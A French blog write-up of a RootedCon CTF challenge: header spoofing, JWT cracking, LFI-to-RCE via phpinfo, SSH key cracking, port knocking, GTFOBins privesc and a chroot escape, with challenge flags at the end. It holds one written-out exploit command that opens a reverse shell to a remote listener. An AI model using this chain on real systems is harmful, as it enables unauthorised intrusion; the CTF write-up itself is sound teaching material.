---
title: "Writeup - RootedCon CTF By Advens"
date: "2024-03-06"
categories:
  - "writeups"
tags:
  - "writeup"
image: "/medias/writeups/rootedcon-by-advens/2024-03-06_15-45.jpg"
---

Cette année, Advens propose un challenge pour la RootedCon. Mes collègues me l'ont envoyé en avance afin de le tester.

Au moment où j'ai reçu le challenge l’énoncé était clair : voici l'ip. Je commence donc par une première phase d'analyse de l'application pour voir ce qui est proposé.

## Reconnaissance :

L'application propose un formulaire d'enregistrement / connexion. Un captcha est présent, celui-ci est suffisamment robuste pour ne pas faire partie du challenge. Je crée donc un compte utilisateur pour accéder à l'application.

![Interface d'authentification](/medias/writeups/rootedcon-by-advens/image-1024x867.png)

J'arrive ensuite sur une interface utilisateur qui permet de visualiser des pochettes de comics et de voter pour notre préféré.

![Interface principale](/medias/writeups/rootedcon-by-advens/image-1-1024x769.png)

Un message de l'administrateur indique qu'aucun bruteforce n'est nécessaire.

![Message de l'administrateur](/medias/writeups/rootedcon-by-advens/image-2.png)

En regardant bien le code source de l'application, je repère la présence d'un lien commenté.

![Lien commenté](/medias/writeups/rootedcon-by-advens/image-3-1024x119.png)

Celui-ci permet d'accéder à l'interface "admin". Cependant, celle-ci nécessite une authentification.

![](/medias/writeups/rootedcon-by-advens/image-4-1024x573.png)

Enfin, une page "phpinfo.php" semble accessible, mais restreinte à une IP spécifique.

![Interface PHPInfo.php](/medias/writeups/rootedcon-by-advens/image-5-1024x579.png)

L'accès à cette interface peut se faire en ajoutant un header "X-Forwarded-For".

![](/medias/writeups/rootedcon-by-advens/image-6-1024x332.png)

J'obtiens donc un accès à l'interface phpinfo.php.

![Accès PHPInfo.php](/medias/writeups/rootedcon-by-advens/image-7-1024x300.png)

## Accès admin

Une fois authentifié en simple utilisateur, je reçois un cookie de session contenant un JWT. Après analyse dans jwt.io, je constate que le JWT est chiffré de manière symétrique à l'aide d'un mot de passe.

![JWT](/medias/writeups/rootedcon-by-advens/image-8-1024x563.png)

Celui-ci contient une date d'expiration et un nom d'utilisateur.

### Recherche de la clef

Pour obtenir la clef j'utilise l'outil [JWT-Cracker](https://github.com/lmammino/jwt-cracker).

![Obtention du mot de passe](/medias/writeups/rootedcon-by-advens/image-9.png)

Je peux alors forger un nouveau JWT en modifiant le nom d'utilisateur par "admin" et ainsi obtenir un accès sur l'interface.

### Reverse Shell

L'interface d’administration propose de modifier les informations sur les éléments affichés sur l'interface principale et de consulter un fichier de logs.

Pour cela, une requête POST est envoyé contenant un paramètre "file".

![Requête](/medias/writeups/rootedcon-by-advens/image-10.png)

Remplacer "logs.txt" par une valeur vide permet de mettre en évidence une vulnérabilité LFI.

![Mise en évidence de la LFI](/medias/writeups/rootedcon-by-advens/image-11.png)

Cependant, un filtre est présent sur le paramètre file et remplace l'ensemble des "/" par une chaine vide. Après avoir tenté de nombreux encodage j'abandonne cette technique.

À ce moment-là un état des lieux s'impose :

- LFI permettant de lire un fichier dans /tmp
- Accès PHPInfo

À partir de ces accès, un scénario de compromission existe : [LFI2RCE via PHPInfo](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo)

En résumé, la page phpinfo peut être utilisée pour envoyer un fichier qui sera stocké de manière temporaire dans /tmp juste le temps que le serveur se rende compte qu'il n'a pas besoin du fichier et le supprime.  
Ainsi si en parallèle, il est possible de contacter ce fichier via une autre vulnérabilité celui-ci peut être exécuté.

Et c'est pile le cas dans lequel nous sommes !

Il existe plusieurs codes d'exploitation pour cette vulnérabilité, cependant aucun d'entre eux ne prend en compte le scénario proposé, il faudra alors modifier l'exploit pour le rendre compatible avec le challenge.

```
https://github.com/takabaya-shi/LFI2RCE ;
https://github.com/roughiz/lfito_rce
```

![Modification de l'exploit](/medias/writeups/rootedcon-by-advens/image-12.png)

```bash
python lfito_rce.py --payload 1 -l 'http://164.90.211.116:8000/marvel-admin.php' --lhost remoteserver --lport 1234 -i 'http://164.90.211.116:8000/phpinfo.php' -t 1
```

![Exploit](/medias/writeups/rootedcon-by-advens/image-13.png)

Pour le débug, j'utilise un proxy Burp pour l'ensemble des requêtes afin de voir l'exécution pas à pas.

![Mise en évidence du succès de l'exploitation.](/medias/writeups/rootedcon-by-advens/image-14.png)

Une fois l'exploit passé, j'obtiens un shell.

![Shell obtenu](/medias/writeups/rootedcon-by-advens/image-27.png)

Je dispose des droits de l'utilisateur "www-data"

![Privilèges](/medias/writeups/rootedcon-by-advens/image-28.png)

Le flag de cette partie peut être obtenu dans le fichier functions.php

![Obtention du second flag](/medias/writeups/rootedcon-by-advens/image-32.png)

## Privesc

À partir du shell obtenu, je peux me balader sur le système. Je découvre alors un fichier clef ssh.

![Découverte du fichier clef ssh](/medias/writeups/rootedcon-by-advens/image-29.png)

![Clef ssh](/medias/writeups/rootedcon-by-advens/image-30.png)

Ainsi qu'un message dans /tmp/notes.txt

![Message](/medias/writeups/rootedcon-by-advens/image-31.png)

Je comprends alors que la clef ssh appartient à l'utilisateur "drstrange" et qu'il s'agit de la prochaine étape du challenge.

Cette clef est protégée par une passphrase, pour l'obtenir, il existe un script "ssh2john.py" qui permet de convertir la clef vers un format "exploitable" par John the ripper.

![Utilisation de johntheripper](/medias/writeups/rootedcon-by-advens/image-15.png)

Dans les versions présentes dans les dépôts des différentes distributions, john est incapable d'attaquer la clef proposée. Il faut utiliser la version présente sur le [github du projet](https://github.com/openwall/john) (je vous passe l'étape du ./configure && make )

Une fois recompilé, j'envoie rockyou.txt et j'attends mon mot de passe.

![Obtention du mot de passe](/medias/writeups/rootedcon-by-advens/image-16.png)

J'obtiens alors un accès sur une interface SSH, mais celle-ci n'est pas interactive.

![Accès shell](/medias/writeups/rootedcon-by-advens/image-17.png)

Le message affiché laisse entendre qu'il va falloir faire du port knocking sur différents ports :

![Découverte du message caché](/medias/writeups/rootedcon-by-advens/image-18.png)

![Message](/medias/writeups/rootedcon-by-advens/image-20.png)

Pour cela, le binaire "knockd" peut être utilisé :

![Utilisation de knockd](/medias/writeups/rootedcon-by-advens/image-19.png)

Puis il suffit de se connecter sur le port 2222 :
J'obtiens un accès utilisateur, une rapide recherche des droits permettent de repérer l'utilisation d'un [GTFOBin](https://gtfobins.github.io/) :

![Découverte d'une élévation de privilège](/medias/writeups/rootedcon-by-advens/image-21.png)

![Exploitation de la vulnérabilité](/medias/writeups/rootedcon-by-advens/image-22.png)

J'obtiens ainsi un accès root sur le serveur.

## Got root ?

Le flag récupérable à la racine indique que je n'ai pas encore les droits maximums sur la machine.

![Le flag indique qu'il reste une étape](/medias/writeups/rootedcon-by-advens/image-23.png)

Un utilisateur root qui n'est pas root sur sa machine ? peut être un chroot !
Le fichier .bashrc trahis en effet l'utilisation de ce procédé.

![Mise en évidence du chroot](/medias/writeups/rootedcon-by-advens/image-24.png)

Pour sortir de cet environnement cloisonné, j'utilise [chw00t](https://github.com/earthquake/chw00t). La machine distante ne disposant pas de binaires permettant de télécharger du contenu, et la connexion SCP étant peu stable à cause du port knocking j'ai décidé de compiler le binaire sur ma machine, de l'encoder en base64, copier / coller et de le décoder sur la machine cilbe.

![Such h4ck3r sk1ll](/medias/writeups/rootedcon-by-advens/image-33.png)

![Exploitation de la vulnérabilité](/medias/writeups/rootedcon-by-advens/image-25.png)

![Véritable Flag](/medias/writeups/rootedcon-by-advens/image-26.png)

## Conclusion

Ce challenge m'a permis de jouer avec la vulnérabilité lfi2rce via phpinfo et de découvrir l'outil chw00t. Ayant fait ce challenge en dehors de la compétition, je ne peux pas parler de celle-ci.

Un grand merci à mes collègues espagnols de m'avoir envoyé ce challenge.

Flags :

```
ADVENS{w17h_GR347_p0w3R_C0m35_GR347_r35P0N5181l17y}
ADVENS{7h3_0N3_4nd_0NLY}FLAG{DRSr4nG3_RUl3s}
FAKE_FLAG{Not_The_fl4G_Y0uR_Lo0k1nG_FoR}
FLAG{yoUr3R00T}
```
